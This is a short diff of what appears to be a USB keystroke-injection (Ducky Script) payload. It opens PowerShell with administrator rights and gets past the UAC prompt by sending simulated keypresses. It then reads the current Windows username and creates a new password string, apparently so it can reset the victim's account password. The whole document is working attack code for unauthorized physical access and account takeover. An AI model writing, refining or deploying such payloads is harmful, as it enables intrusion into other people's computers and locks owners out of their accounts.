@@ -7,14 +7,18 @@ WINDOWS d
 DELAY 1500
 WINDOWS r
 DELAY 1500
-ALTSTRING powershell Start-Process powershell -Verb runAs
+STRING powershell
 DELAY 1500
+CTRL-SHIFT ENTER
+DELAY 1500
+LEFTARROW
+DELAY 600
 ENTER
-DELAY 2000
+DELAY 1500
 ALTSTRING $User = ([Environment]::UserName)
 ENTER
 DELAY 500
-ALTSTRING $NewPassword = ConvertTo-SecureString "Zli123" -AsPlainText -Force
+ALTSTRING $NewPassword = ConvertTo-SecureString "Zli12345" -AsPlainText -Force
 DELAY 300
 ENTER
 DELAY 500
